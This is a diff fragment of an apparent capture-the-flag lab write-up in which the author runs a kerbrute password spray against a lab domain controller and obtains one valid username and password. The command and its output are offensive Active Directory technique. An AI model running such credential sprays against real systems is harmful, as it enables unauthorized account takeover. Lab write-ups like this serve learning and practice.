@@ -365,5 +365,21 @@ So earlier i got a hint from the file i found on FTP
 Ill try and spray some usernames
 
 ```python
+kerbrute passwordspray -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt 'Lustrous2024'
 
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/07/26 - Ronnie Flathers @ropnop
+
+2026/04/07 11:30:26 >  Using KDC(s):
+2026/04/07 11:30:26 >  	lus2dc.lustrous2.vl:88
+
+2026/04/07 11:30:26 >  [+] VALID LOGIN:	 Thomas.Myers@lustrous2.vl:Lustrous2024
+2026/04/07 11:30:26 >  Done! Tested 71 logins (1 successes) in 0.339 seconds
 ```
+After trying several different combinations i found a valid logon
+
